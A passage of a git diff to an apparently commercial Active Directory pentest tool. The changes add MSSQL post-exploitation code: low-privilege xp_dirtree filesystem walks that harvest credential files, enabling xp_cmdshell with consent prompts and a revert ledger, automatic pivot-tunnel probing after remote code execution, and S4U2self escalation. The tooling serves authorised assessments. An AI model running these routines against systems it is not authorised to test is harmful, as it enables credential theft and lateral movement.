@@ -7,7 +7,7 @@ of the giant `adscan.py`, while delegating execution logic to the service layer.
 from __future__ import annotations
 
 from collections.abc import Callable
-from dataclasses import dataclass
+from dataclasses import asdict, dataclass, replace
 from datetime import datetime, timezone
 import json
 import os
@@ -33,8 +33,15 @@ from adscan_internal.integrations.mssql import (
     parse_xp_cmdshell_enable_failure_reason,
     print_mssql_sweep_card,
 )
+from adscan_internal.integrations.mssql import queries as mssql_queries
 from adscan_internal.cli.common import build_lab_event_fields
+from adscan_internal.interaction import is_non_interactive
 from adscan_internal.rich_output import mark_sensitive
+from adscan_internal.services.cleanup_taxonomy import MANUAL_REASON_REVERT_FAILED
+from adscan_internal.services.environment_change_ledger import (
+    CHANGE_CLASS_AUTO_REVERT,
+)
+from adscan_core.output import confirm_ask
 from adscan_internal.services.exploitation import ExploitationService
 from adscan_internal.services.exploitation.remote_windows_execution import (
     RemoteWindowsAuth,
@@ -49,7 +56,10 @@ from adscan_internal.services.pivot_opportunity_service import (
 from adscan_internal.services.pivot_reachability_candidate_service import (
     collect_pivot_reachability_candidates,
 )
-from adscan_internal.services.pivot_service import orchestrate_ligolo_pivot_tunnel
+from adscan_internal.services.pivot_service import (
+    is_pivoting_enabled,
+    orchestrate_ligolo_pivot_tunnel,
+)
 from adscan_internal.services.post_pivot_followup_service import (
     PivotExecutionContext,
     maybe_offer_post_pivot_owned_followup,
@@ -767,7 +777,9 @@ def _run_mssql_filesystem_mapping(
     mapping_service = WindowsFileMappingService()
 
     # ── Mapping cache check ───────────────────────────────────────────────────
-    from adscan_internal.services.windows_loot_cache_service import try_use_mapping_cache
+    from adscan_internal.services.windows_loot_cache_service import (
+        try_use_mapping_cache,
+    )
 
     workspace_type_mssql = str(getattr(shell, "type", "") or "").strip().lower()
 
@@ -793,6 +805,7 @@ def _run_mssql_filesystem_mapping(
         )
 
     if mapping_result is None:
+
         def _executor(script: str) -> WindowsPowerShellExecutionResult:
             result = remote_executor.execute_powershell(
                 auth,
@@ -821,6 +834,7 @@ def _run_mssql_filesystem_mapping(
             )
         except WindowsFileMappingError as exc:
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_error(f"MSSQL filesystem mapping failed: {exc}")
             return {"completed": False, "error": str(exc)}
 
@@ -967,8 +981,12 @@ def _run_mssql_filesystem_mapping(
     # and extract credentials offline via a native SMB sparse read (the read needs
     # SMB/445 to the host — MSSQL is the discovery transport, not the read one).
     _run_mssql_vm_disk_scan(
-        shell, domain=domain, host=host, entries=entries,
-        username=username, password=password,
+        shell,
+        domain=domain,
+        host=host,
+        entries=entries,
+        username=username,
+        password=password,
     )
 
     loot_root_rel = os.path.relpath(run_root_abs, _get_workspace_dir(shell))
@@ -1063,8 +1081,364 @@ def _run_mssql_vm_disk_scan(
         return stored_total
     except Exception as exc:  # noqa: BLE001 - VM disk scan must never abort the MSSQL scan
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         print_info_debug(f"MSSQL VM disk artifact scan failed (non-fatal): {exc}")
         return 0
+
+
+def _run_mssql_low_privilege_file_review(
+    shell: MssqlShell,
+    backend: ImpacketMSSQLBackend,
+    *,
+    domain: str,
+    host: str,
+    username: str,
+    password: str,
+) -> dict[str, object]:
+    """Low-privilege filesystem / credential-hygiene review via ``xp_dirtree``.
+
+    Last-resort avenue when NO MSSQL command-execution surface exists (no
+    local or linked ``xp_cmdshell``). ``xp_dirtree`` is, by default,
+    EXECUTE-granted to the ``public`` role — every authenticated login can
+    walk the SQL service account's filesystem view this way, without ever
+    needing ``xp_cmdshell``. Reports one of three honest states mirroring the
+    report's exploited/partial/closed doctrine (see
+    ``adscan_internal.services.mssql_xp_dirtree_review_service`` for the full
+    state table). Best-effort end to end: any failure degrades to a
+    reported-but-non-fatal outcome so a probe/backend surprise never aborts
+    the surrounding post-auth workflow.
+    """
+    marked_host = mark_sensitive(host, "hostname")
+    try:
+        from adscan_internal.services.mssql_xp_dirtree_review_service import (
+            DEFAULT_WEB_SERVED_ROOTS,
+            STATUS_CLOSED_BY_CONFIGURATION,
+            STATUS_GRANTED_HARDENING_NOTE,
+            build_candidate_http_urls,
+            classify_web_retrieval_outcome,
+            classify_xp_dirtree_review_outcome,
+            discover_additional_iis_site_roots,
+            discover_filesystem_via_xp_dirtree,
+            fetch_file_via_http_get_candidates,
+            parse_xp_dirtree_capability_rows,
+            select_web_ports_from_open_ports,
+        )
+
+        print_operation_header(
+            "MSSQL Low-Privilege Filesystem Review",
+            details={"Domain": domain, "Host": host, "Username": username},
+            icon="🗂️",
+        )
+
+        capability_probe = backend.probe_xp_dirtree_capability(
+            domain=domain,
+            username=username,
+            secret=password,
+            timeout=30,
+        )
+        if not capability_probe.success:
+            print_info(
+                "Could not evaluate the low-privilege directory-listing avenue on "
+                f"{marked_host}."
+            )
+            return {"completed": False, "status": "probe_failed"}
+
+        capability = parse_xp_dirtree_capability_rows(capability_probe.rows)
+
+        if not capability.can_walk:
+            print_success(
+                "Low-privilege filesystem read via directory listing is closed by "
+                f"configuration on {marked_host} (EXECUTE on the directory-listing "
+                "extended procedure is revoked from this login)."
+            )
+            return {"completed": True, "status": STATUS_CLOSED_BY_CONFIGURATION}
+
+        manifest = discover_filesystem_via_xp_dirtree(
+            backend,
+            domain=domain,
+            username=username,
+            secret=password,
+        )
+        entries: list[WindowsFileMapEntry] = list(manifest.get("entries") or [])
+
+        outcome = classify_xp_dirtree_review_outcome(
+            capability=capability, found_any_entries=bool(entries)
+        )
+
+        if outcome == STATUS_GRANTED_HARDENING_NOTE:
+            print_warning(
+                f"Any authenticated database login can enumerate the {marked_host} "
+                "filesystem via directory listing (no files of interest surfaced in "
+                "this pass). Recommend revoking EXECUTE on the directory-listing and "
+                "file-existence extended procedures from the public role."
+            )
+            return {"completed": True, "status": outcome, "entry_count": 0}
+
+        # outcome is the exposure state: persist the manifest and run the SAME
+        # credential-hygiene analysis pipeline the exec-driven flow uses.
+        # Content retrieval tries a plain HTTP GET first when the entry sits
+        # under a discovered IIS web root (zero extra MSSQL permission beyond
+        # the directory listing that already found it), then falls back to
+        # the shared MSSQL download path (OPENROWSET(BULK ...) native-first,
+        # PowerShell-stream fallback — which simply fails gracefully here
+        # since there is no command-execution surface to fall back to).
+        workspace_dir = _get_workspace_dir(shell)
+        cache_key = WindowsFileMappingService.build_cache_key(
+            host=host,
+            username=username,
+            root_strategy="xp_dirtree",
+        )
+        output_path = os.path.join(
+            workspace_dir,
+            shell.domains_dir,
+            domain,
+            "mssql",
+            "sensitive",
+            cache_key,
+            "file_tree_map.json",
+        )
+        os.makedirs(os.path.dirname(output_path), exist_ok=True)
+        with open(output_path, "w", encoding="utf-8") as handle:
+            json.dump(
+                {**manifest, "entries": [asdict(entry) for entry in entries]},
+                handle,
+                indent=2,
+            )
+        print_warning(
+            f"Low-privilege filesystem-read exposure on {marked_host}: {len(entries)} "
+            "file(s) reachable via directory listing without command execution. "
+            "Recommend revoking EXECUTE on the directory-listing and file-existence "
+            "extended procedures from the public role."
+        )
+
+        remote_executor = RemoteWindowsExecutionService(shell)
+        auth = RemoteWindowsAuth(
+            domain=domain, host=host, username=username, secret=password
+        )
+
+        # HTTP-GET retrieval is only sane against ACTUAL web-served roots (the
+        # default wwwroot plus any additional IIS site discovered under
+        # C:\inetpub) — never the Backup/Temp discovery roots, which are never
+        # web-served and would be a guaranteed 404.
+        web_roots: tuple[str, ...] = DEFAULT_WEB_SERVED_ROOTS + (
+            discover_additional_iis_site_roots(
+                backend, domain=domain, username=username, secret=password
+            )
+        )
+        web_ports = select_web_ports_from_open_ports(
+            _resolve_mssql_host_open_ports(shell, domain=domain, host=host)
+        )
+        web_hosts = _resolve_web_get_host_candidates(shell, domain=domain, host=host)
+        # Per-remote-path HTTP-GET diagnosis, accumulated across every fetch —
+        # a discovered-but-not-retrievable file must never disappear silently.
+        http_get_diagnosis: list[dict[str, object]] = []
+
+        def _low_priv_file_fetcher(remote_path: str, save_path: str) -> str:
+            web_urls = build_candidate_http_urls(
+                hosts=web_hosts,
+                web_roots=web_roots,
+                full_path=remote_path,
+                ports=web_ports,
+            )
+            if web_urls:
+                content, attempts = fetch_file_via_http_get_candidates(web_urls)
+                if content is not None:
+                    os.makedirs(os.path.dirname(save_path), exist_ok=True)
+                    with open(save_path, "wb") as content_handle:
+                        content_handle.write(content)
+                    return save_path
+                web_outcome = classify_web_retrieval_outcome(attempts)
+                if web_outcome == "found_not_retrievable":
+                    http_get_diagnosis.append(
+                        {
+                            "remote_path": remote_path,
+                            "urls_tried": [attempt.url for attempt in attempts],
+                            "statuses": [attempt.status for attempt in attempts],
+                        }
+                    )
+            return _download_mssql_target(
+                remote_executor=remote_executor,
+                auth=auth,
+                remote_path=remote_path,
+                local_path=save_path,
+            )
+
+        run_root_abs = os.path.join(os.path.dirname(output_path), "phases")
+        os.makedirs(run_root_abs, exist_ok=True)
+
+        from adscan_internal.services.smb_sensitive_phase_orchestration_service import (
+            select_sensitive_scan_phases,
+        )
+
+        selected_phases = select_sensitive_scan_phases(
+            shell, domain=domain, transport_label="MSSQL (low-privilege)"
+        )
+        if not selected_phases:
+            print_info(
+                "No MSSQL low-privilege credential-hunt phases selected — skipping analysis."
+            )
+            return {
+                "completed": True,
+                "status": outcome,
+                "output_path": output_path,
+                "entry_count": len(entries),
+                "phases_run": [],
+            }
+
+        phase_sequence = get_production_sensitive_scan_phase_sequence()
+        results: list[dict[str, object]] = []
+
+        def _run_phase(phase: str) -> dict[str, object]:
+            phase_definition = get_sensitive_phase_definition(phase)
+            phase_label = str(phase_definition.get("label", phase) or phase)
+            if phase in {
+                SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
+                SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
+            }:
+                phase_extensions = get_sensitive_file_extensions(
+                    str(phase_definition.get("profile", ""))
+                )
+            else:
+                phase_extensions = get_sensitive_phase_extensions(phase)
+            selected_entries = WindowsFileMappingService.select_entries_by_extensions(
+                entries=entries,
+                extensions=phase_extensions,
+            )
+            phase_root_abs = os.path.join(run_root_abs, phase)
+            loot_dir = os.path.join(phase_root_abs, "loot")
+            os.makedirs(loot_dir, exist_ok=True)
+            print_info(
+                "Running low-privilege credential-hygiene review "
+                f"({mark_sensitive(phase_label, 'text')}) on {marked_host}."
+            )
+
+            def phase_fetcher() -> WindowsArtifactAcquisitionResult:
+                file_targets = [
+                    (
+                        entry.full_name,
+                        WindowsFileMappingService.build_local_relative_path(
+                            entry.full_name
+                        ),
+                    )
+                    for entry in selected_entries
+                    if entry.full_name
+                ]
+                return WindowsArtifactAcquisitionService().acquire_files(
+                    file_targets=file_targets,
+                    download_dir=loot_dir,
+                    workspace_type=str(getattr(shell, "type", "") or "").strip().lower()
+                    or None,
+                    file_fetcher=_low_priv_file_fetcher,
+                )
+
+            return (
+                WindowsSensitivePhaseExecutionService()
+                .execute_phase(
+                    shell,
+                    domain=domain,
+                    host=host,
+                    username=username,
+                    phase=phase,
+                    phase_label=phase_label,
+                    phase_root_abs=phase_root_abs,
+                    loot_dir=loot_dir,
+                    selected_entries_count=len(selected_entries),
+                    phase_excluded_total=0,
+                    fetcher=phase_fetcher,
+                    source_share="mssql",
+                    source_artifact="mssql low-privilege directory listing",
+                    transport_label="MSSQL (low-privilege)",
+                )
+                .to_dict()
+            )
+
+        for phase in phase_sequence:
+            if phase not in selected_phases:
+                continue
+            results.append(_run_phase(phase))
+
+        if http_get_diagnosis:
+            print_warning(
+                f"{len(http_get_diagnosis)} discovered file(s) on {marked_host} sit "
+                "under a web-served root but were NOT retrievable over HTTP (auth "
+                "required, a different URL, or not actually served at that path) — "
+                "review them manually: "
+                + ", ".join(
+                    mark_sensitive(str(item["remote_path"]), "path")
+                    for item in http_get_diagnosis
+                )
+            )
+
+        return {
+            "completed": True,
+            "status": outcome,
+            "output_path": output_path,
+            "entry_count": len(entries),
+            "phases_run": results,
+            "http_get_diagnosis": http_get_diagnosis,
+        }
+    except Exception as exc:  # noqa: BLE001 - last-resort review must never abort the workflow
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        print_info_debug(
+            f"[mssql] low-privilege filesystem review raised on {marked_host}: {exc}"
+        )
+        return {"completed": False, "status": "review_failed"}
+
+
+def _resolve_mssql_host_open_ports(
+    shell: MssqlShell, *, domain: str, host: str
+) -> tuple[int, ...]:
+    """Best-effort read of ``host``'s KNOWN open ports from the persisted
+    current-vantage reachability report (the same inventory the pivot
+    reachability checks use).
+
+    Returns an empty tuple when the report is unavailable or the host is
+    unmatched — the caller (:func:`select_web_ports_from_open_ports`) then
+    falls back to the plain 80/443 default rather than guessing at scale.
+    """
+    try:
+        from adscan_internal.services.current_vantage_reachability_service import (
+            resolve_targets_from_current_vantage,
+        )
+
+        resolution = resolve_targets_from_current_vantage(
+            _get_workspace_dir(shell),
+            shell.domains_dir,
+            domain,
+            targets=[host],
+        )
+        for assessment in resolution.assessments:
+            if assessment.matched:
+                return assessment.open_ports
+        return ()
+    except Exception as exc:  # noqa: BLE001 - best-effort, never blocks the review
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        return ()
+
+
+def _resolve_web_get_host_candidates(
+    shell: MssqlShell, *, domain: str, host: str
+) -> list[str]:
+    """Return the HTTP-GET ``Host`` candidates to try for one MSSQL target: the
+    raw IP/hostname ADscan connected to, plus the domain's resolved DC FQDN
+    when it differs (some IIS host-header bindings require the exact FQDN to
+    route to the right site). Best-effort — a resolution failure just leaves
+    the single raw-host candidate.
+    """
+    candidates = [host]
+    try:
+        from adscan_internal.models.domain import resolve_dc_fqdn
+
+        domain_data = (getattr(shell, "domains_data", None) or {}).get(domain) or {}
+        dc_fqdn = resolve_dc_fqdn(domain_data, target_domain=domain)
+        if dc_fqdn and dc_fqdn.strip().lower() != host.strip().lower():
+            candidates.append(dc_fqdn.strip())
+    except Exception as exc:  # noqa: BLE001 - best-effort, never blocks the review
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+    return candidates
 
 
 def check_pivot_reachability_via_mssql(
@@ -1076,8 +1450,21 @@ def check_pivot_reachability_via_mssql(
     password: str,
     execution_path: MssqlExecutionPath,
     offer_post_pivot_owned_followup: bool = True,
+    consent_default_override: bool | None = None,
 ) -> None:
-    """Check whether an MSSQL-execution host can reach IPs hidden from the original vantage."""
+    """Check whether an MSSQL-execution host can reach IPs hidden from the original vantage.
+
+    Args:
+        consent_default_override: When given, overrides the CTF-workspace-based
+            default for the probe/tunnel consent prompts below (propagated to
+            :func:`orchestrate_ligolo_pivot_tunnel`). Automatic, scan-config-gated
+            callers (``pivoting.enabled`` — see
+            :func:`adscan_internal.services.pivot_service.is_pivoting_enabled`)
+            pass ``True`` since the operator already opted into this class of
+            action at scan-config level. ``None`` (the default) preserves
+            today's ``shell.type == "ctf"`` heuristic unchanged for the manual
+            interactive command.
+    """
     from adscan_internal.cli.winrm import _load_workspace_network_reachability_report
 
     reachability_payload = _load_workspace_network_reachability_report(
@@ -1245,14 +1632,24 @@ def check_pivot_reachability_via_mssql(
             f"preview={mark_sensitive(', '.join(f'{target.ip}:{target.origin}:{target.selection_reason}' for target in selected_targets), 'text')}"
         )
 
-        default_confirm = str(getattr(shell, "type", "") or "").strip().lower() == "ctf"
-        if not Confirm.ask(
-            (
-                f"Do you want to probe {len(selected_targets)} likely pivot target(s) from "
-                f"{mark_sensitive(host, 'hostname')} via MSSQL?"
-            ),
-            default=default_confirm,
-        ):
+        default_confirm = (
+            consent_default_override
+            if consent_default_override is not None
+            else str(getattr(shell, "type", "") or "").strip().lower() == "ctf"
+        )
+        pivot_probe_prompt = (
+            f"Do you want to probe {len(selected_targets)} likely pivot target(s) from "
+            f"{mark_sensitive(host, 'hostname')} via MSSQL?"
+        )
+        # Route through the shell's confirm helper (when available) rather than
+        # a raw Confirm.ask so non-interactive runs auto-resolve using the real
+        # shell context, not just the module-level Confirm.ask patch.
+        confirmer = getattr(shell, "_questionary_confirm", None)
+        if callable(confirmer):
+            proceed = bool(confirmer(pivot_probe_prompt, default=default_confirm))
+        else:
+            proceed = confirm_ask(pivot_probe_prompt, default=default_confirm)
+        if not proceed:
             print_info("Skipping MSSQL pivot reachability probing by user choice.")
             return
 
@@ -1403,6 +1800,7 @@ def check_pivot_reachability_via_mssql(
                 remote_agent_os="windows",
                 source_service="mssql",
                 pivot_method="ligolo_mssql_pivot",
+                consent_default_override=consent_default_override,
             )
             if tunnel_created:
                 pivot_context = PivotExecutionContext(
@@ -1435,8 +1833,101 @@ def check_pivot_reachability_via_mssql(
                         )
     except Exception as exc:  # noqa: BLE001
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         print_warning(
             f"MSSQL pivot reachability check failed on {mark_sensitive(host, 'hostname')}: {str(exc)}"
+        )
+
+
+def maybe_pivot_after_xpcmdshell_success(
+    shell: MssqlShell,
+    *,
+    domain: str,
+    host: str,
+    username: str,
+    password: str,
+    linked_server: str | None = None,
+    identity: str | None = None,
+) -> None:
+    """Probe for a fresh pivot opportunity after a successful xp_cmdshell RCE.
+
+    SINGLE reusable entry point for "a successful xp_cmdshell edge should be
+    checked as a possible pivot origin" — used both by the automatic
+    cross-domain-unreachable-credential rescue in
+    :func:`run_xpcmdshell_system_escalation_followup` and by the general
+    graph-driven ``xp_cmdshell`` attack-step success hook in
+    ``attack_path_execution.py``. Do not duplicate the
+    :class:`MssqlExecutionPath` construction / :func:`check_pivot_reachability_via_mssql`
+    call at either site — route both through this helper.
+
+    Strict no-op gate: only runs when the operator has opted in via
+    ``pivoting.enabled`` (:func:`~adscan_internal.services.pivot_service.is_pivoting_enabled`).
+    That scan-config opt-in IS the consent for this automatic path, so the
+    downstream probe/tunnel prompts are forced to proceed
+    (``consent_default_override=True``) rather than falling back to the
+    CTF-workspace heuristic ``check_pivot_reachability_via_mssql`` otherwise
+    uses for the manual/interactive command.
+
+    Dedup guard: keyed on ``(domain, host)`` — the pivot ORIGIN (the MSSQL
+    instance with the live SQL execution channel), persisted on
+    ``shell._mssql_pivot_probed_hosts`` for the session. A second successful
+    ``xp_cmdshell`` edge reaching the SAME origin host (e.g. Part 1's
+    cross-domain rescue call followed by Part 2's general graph hook on the
+    same step, or two graph edges chained through the same linked-server
+    instance) is a no-op re-probe/re-tunnel-setup attempt. Keyed on the origin
+    HOST rather than the target subnet because re-probing the identical
+    vantage point is always wasteful, whereas a different target subnet
+    reached via a DIFFERENT host is a genuinely new candidacy question worth a
+    fresh probe.
+
+    Never raises — this is a best-effort follow-up hung off an
+    already-succeeded attack step; a pivot failure here must never fail the
+    step that unlocked it.
+    """
+    if not is_pivoting_enabled(shell):
+        return
+    try:
+        probed_hosts = getattr(shell, "_mssql_pivot_probed_hosts", None)
+        if not isinstance(probed_hosts, set):
+            probed_hosts = set()
+            shell._mssql_pivot_probed_hosts = probed_hosts
+        dedup_key = (
+            str(domain or "").strip().lower(),
+            str(host or "").strip().lower(),
+        )
+        if dedup_key in probed_hosts:
+            print_info_debug(
+                "Skipping MSSQL pivot probe: already attempted from "
+                f"{mark_sensitive(host, 'hostname')} this session."
+            )
+            return
+        probed_hosts.add(dedup_key)
+
+        execution_path = MssqlExecutionPath(
+            mode="linked_xpcmd" if linked_server else "xp_cmdshell",
+            linked_server=linked_server,
+            identity=identity,
+        )
+        check_pivot_reachability_via_mssql(
+            shell,
+            domain=domain,
+            host=host,
+            username=username,
+            password=password,
+            execution_path=execution_path,
+            # This is an automatic background hook off a graph-driven attack
+            # step, not an operator-driven takeover — don't chain into an
+            # unrelated "owned" escalation offer.
+            offer_post_pivot_owned_followup=False,
+            # Scan-config pivoting.enabled already IS the consent for this
+            # automatic path.
+            consent_default_override=True,
+        )
+    except Exception as exc:  # noqa: BLE001 - best-effort, must never break the caller
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        print_warning(
+            f"MSSQL pivot probe raised for {mark_sensitive(host, 'hostname')}: {exc}."
         )
 
 
@@ -1466,6 +1957,7 @@ def _load_mssql_host_alias_inventory(
         )
     except Exception as exc:  # noqa: BLE001 - degrade to no-inventory
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         return {}
 
 
@@ -1524,10 +2016,13 @@ def _service_account_owns_mssql_spn(
         # returns the FLATTENED properties dict directly, so ``serviceprincipalnames``
         # is a top-level key — NOT nested under ``properties``. Handle both shapes
         # defensively so a future node-with-nested-properties return still resolves.
-        props = node.get("properties") if isinstance(node.get("properties"), dict) else node
+        props = (
+            node.get("properties") if isinstance(node.get("properties"), dict) else node
+        )
         spns = props.get("serviceprincipalnames") or []
     except Exception as exc:
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         return False
 
     # Collect the MSSQLSvc SPNs the account actually owns (host portion, no port).
@@ -1576,9 +2071,7 @@ def _service_account_owns_mssql_spn(
     return False
 
 
-def _select_domain_admin_for_s4u2self(
-    shell: MssqlShell, *, domain: str
-) -> str | None:
+def _select_domain_admin_for_s4u2self(shell: MssqlShell, *, domain: str) -> str | None:
     """Offer the operator a Domain Admin to impersonate; Administrator first.
 
     ``Administrator`` is offered as the default because the built-in account is
@@ -1705,7 +2198,9 @@ def _try_mssql_s4u2self_as_da(
 
     # --- DC/KDC resolution (FQDN SPN enforced inside the primitive) ---
     domains_data = getattr(shell, "domains_data", None)
-    domain_record = domains_data.get(domain) or {} if isinstance(domains_data, dict) else {}
+    domain_record = (
+        domains_data.get(domain) or {} if isinstance(domains_data, dict) else {}
+    )
     dc_ip = kdc_host or resolve_dc_ip(domain_record)
     if not dc_ip:
         print_info_debug(
@@ -1787,6 +2282,7 @@ def _try_mssql_s4u2self_as_da(
             posture_snapshot = get_posture(domains_data, domain=domain)
     except Exception as posture_exc:
         telemetry.capture_exception(posture_exc)
+        print_exception(exception=posture_exc)
 
     workspace_dir = _get_workspace_dir(shell)
     tickets_dir = os.path.join(workspace_dir, shell.domains_dir, domain, "tickets")
@@ -1864,6 +2360,7 @@ def _try_mssql_s4u2self_as_da(
             )
         except Exception as edge_exc:
             telemetry.capture_exception(edge_exc)
+            print_exception(exception=edge_exc)
         print_success(
             f"S4U2self escalation succeeded: {mark_sensitive(da_user, 'user')} "
             f"is sysadmin on {marked_host}."
@@ -1925,8 +2422,1605 @@ def _verify_xp_cmdshell_executable(
         )
     except Exception as exc:  # noqa: BLE001 - any failure means "not usable now"
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         return False
     return bool(getattr(probe, "success", False))
+
+
+def _get_env_change_ledger(shell: MssqlShell) -> Any:
+    """Return the shell-scoped environment-change ledger, or None when absent.
+
+    Single accessor mirroring the SeImpersonate producer
+    (:func:`run_mssql_takeover_da_workflow`) so both xp_cmdshell registration and
+    revert resolve the ledger the same way.
+    """
+    return getattr(shell, "environment_change_ledger", None)
+
+
+def _consent_enable_xp_cmdshell(
+    shell: MssqlShell, *, marked_target: str, is_linked: bool
+) -> bool:
+    """Ask the operator before enabling ``xp_cmdshell`` on a client SQL Server.
+
+    Enabling ``xp_cmdshell`` is a configuration change on the assessed server.
+    ADscan now registers it in the environment-change ledger and reverts it at
+    scan end, but the operator still consents first. Non-interactive engagements
+    proceed by default — the money-path convention for post-exploitation
+    (mirroring the poisoning job): the client engaged ADscan for an active
+    pentest and the change is auto-reverted. An interactive run must get an
+    explicit ``yes`` (default ``No``).
+
+    Args:
+        shell: The MSSQL shell (threaded so the non-interactive predicate can see
+            ``shell.auto`` / the session command type).
+        marked_target: The already ``mark_sensitive``-wrapped target label
+            (host, or the linked-server name).
+        is_linked: Whether the target is a linked server (affects the wording).
+
+    Returns:
+        True to proceed with the enable, False to leave the configuration alone.
+    """
+    scope_label = "linked server" if is_linked else "host"
+    if is_non_interactive(shell):
+        print_info_debug(
+            "Non-interactive engagement — proceeding to enable xp_cmdshell on "
+            f"{scope_label} {marked_target} (registered in the cleanup ledger and "
+            "reverted at scan end)."
+        )
+        return True
+    return confirm_ask(
+        f"Enable xp_cmdshell on {scope_label} {marked_target}? This modifies the "
+        "SQL Server configuration; ADscan reverts it at scan end.",
+        default=True,
+    )
+
+
+def _route_xp_cmdshell_revert_failure(
+    ledger: Any,
+    change_id: str,
+    *,
+    host: str,
+    linked_server: str | None,
+    error: str,
+) -> None:
+    """Route a failed/unconfirmed xp_cmdshell revert to a manual-required state.
+
+    Records the client-safe native remediation command + the object the client
+    acts on, accounts the failed attempt under the bounded-retry budget, then
+    lands the record in the ONE legal-critical terminal state so the cleanup
+    report (PDF + web) shows a complete manual checklist rather than a
+    half-state.
+    """
+    if ledger is None or not change_id:
+        return
+    remediation_command = "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;"
+    remediation_object = (
+        f"{linked_server} (linked server via {host})" if linked_server else host
+    )
+    try:
+        ledger.set_revert_metadata(
+            change_id,
+            remediation_command=remediation_command,
+            remediation_object_dn=remediation_object,
+        )
+        ledger.mark_revert_retry(change_id, error=error)
+        ledger.mark_manual_required(
+            change_id,
+            reason=MANUAL_REASON_REVERT_FAILED,
+            remediation_command=remediation_command,
+            remediation_object_dn=remediation_object,
+            error=error,
+        )
+    except Exception as exc:  # noqa: BLE001 - ledger bookkeeping is best-effort
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+
+
+@dataclass
+class _LocalXpEnableOutcome:
+    """Result of ensuring LOCAL ``xp_cmdshell`` is enabled on an instance.
+
+    Carries everything the ad-hoc monolith's revert closure and the reusable
+    per-instance primitive both need to decide whether WE changed the server and
+    how to restore it.
+    """
+
+    xp_enabled: bool
+    enabled_by_us: bool
+    original_advanced_on: bool
+    local_change_id: str | None
+    declined: bool
+
+
+@dataclass
+class _LinkedXpEnableOutcome:
+    """Result of ensuring ``xp_cmdshell`` is enabled on a LINKED server."""
+
+    enabled: bool
+    change_id: str | None
+    declined: bool
+
+
+def _ensure_xp_cmdshell_enabled_local(
+    shell: MssqlShell,
+    backend: ImpacketMSSQLBackend,
+    *,
+    domain: str,
+    host: str,
+    username: str,
+    secret: str,
+    marked_host: str,
+    marked_user: str,
+    currently_enabled: bool,
+) -> _LocalXpEnableOutcome:
+    """Consent + ledger-register + enable LOCAL ``xp_cmdshell`` if disabled (SSOT).
+
+    Single source of truth for the "the option is off, so enabling it is an
+    ACTUAL configuration change" path shared by the ad-hoc post-auth workflow
+    (:func:`run_mssql_postauth_workflow`) and the reusable attack-step primitive
+    (:func:`execute_xp_cmdshell_on_instance`). When the option is already ON this
+    is a no-op that reports ``enabled_by_us=False`` (the client's config is left
+    untouched). When disabled it reads the pre-enable advanced-options state,
+    gates the enable behind operator consent, registers the change in the cleanup
+    ledger BEFORE touching the server, then attempts the enable — resolving the
+    ledger record as a confirmed no-op on a denied enable so no phantom change is
+    reported.
+
+    Returns:
+        A :class:`_LocalXpEnableOutcome` describing the resulting state.
+    """
+    if currently_enabled:
+        return _LocalXpEnableOutcome(
+            xp_enabled=True,
+            enabled_by_us=False,
+            original_advanced_on=False,
+            local_change_id=None,
+            declined=False,
+        )
+
+    # Capture the pre-enable advanced-options state so a later revert can restore
+    # it exactly (a box that already had advanced options on must be left that
+    # way). Best-effort: an unreadable state defaults to off.
+    try:
+        _, original_advanced_on = backend._read_xp_cmdshell_state(
+            domain=domain,
+            username=username,
+            secret=secret,
+            timeout=30,
+        )
+    except Exception as exc:  # noqa: BLE001 - state read is best-effort
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        original_advanced_on = False
+
+    # We only reach here when the PRE-state is disabled, so enabling is an ACTUAL
+    # change: gate it behind operator consent and register it in the cleanup
+    # ledger BEFORE touching the server (so a crash mid-enable is covered by the
+    # ledger's session-died guarantee).
+    if not _consent_enable_xp_cmdshell(shell, marked_target=marked_host, is_linked=False):
+        print_info(
+            f"Operator declined enabling xp_cmdshell on {marked_host}; "
+            "leaving the SQL Server configuration untouched."
+        )
+        return _LocalXpEnableOutcome(
+            xp_enabled=False,
+            enabled_by_us=False,
+            original_advanced_on=bool(original_advanced_on),
+            local_change_id=None,
+            declined=True,
+        )
+
+    ledger = _get_env_change_ledger(shell)
+    local_change_id: str | None = None
+    if ledger is not None:
+        try:
+            local_change_id = ledger.register_change(
+                kind="mssql_xp_cmdshell_enabled",
+                domain=domain,
+                target=host,
+                detail={
+                    "host": host,
+                    "linked_server": None,
+                    "original_xp_cmdshell": False,
+                    "original_advanced_options": bool(original_advanced_on),
+                },
+                method="sp_configure",
+                change_class=CHANGE_CLASS_AUTO_REVERT,
+            )
+        except Exception as exc:  # noqa: BLE001
+            telemetry.capture_exception(exc)
+            print_exception(exception=exc)
+
+    print_info_debug(
+        f"xp_cmdshell is disabled on {marked_host}; attempting to enable it "
+        f"as {marked_user} (succeeds for sysadmin / serveradmin / ALTER SETTINGS)."
+    )
+    enable_result = backend.enable_xp_cmdshell(
+        domain=domain,
+        username=username,
+        secret=secret,
+        timeout=60,
+    )
+    if enable_result.success:
+        print_info_debug(f"xp_cmdshell enable attempt succeeded on {marked_host}.")
+        print_warning(
+            f"[bold]xp_cmdshell enabled[/bold] on {marked_host} "
+            "(SQL Server configuration modified - reverted at scan end)."
+        )
+        return _LocalXpEnableOutcome(
+            xp_enabled=True,
+            enabled_by_us=True,
+            original_advanced_on=bool(original_advanced_on),
+            local_change_id=local_change_id,
+            declined=False,
+        )
+
+    # Lacking ALTER SETTINGS is the common, expected outcome for a low-priv
+    # login — it is not fatal, but the operator must SEE why command execution is
+    # unavailable (a debug-only line reads like a silent success). The batch fails
+    # atomically (no partial config change), so the environment is provably
+    # untouched: DISCARD the write-ahead ledger record rather than resolving it as
+    # a confirmed revert, which would report a change that never happened.
+    reason = parse_xp_cmdshell_enable_failure_reason(
+        enable_result.stderr or enable_result.stdout or ""
+    )
+    if reason:
+        print_error(
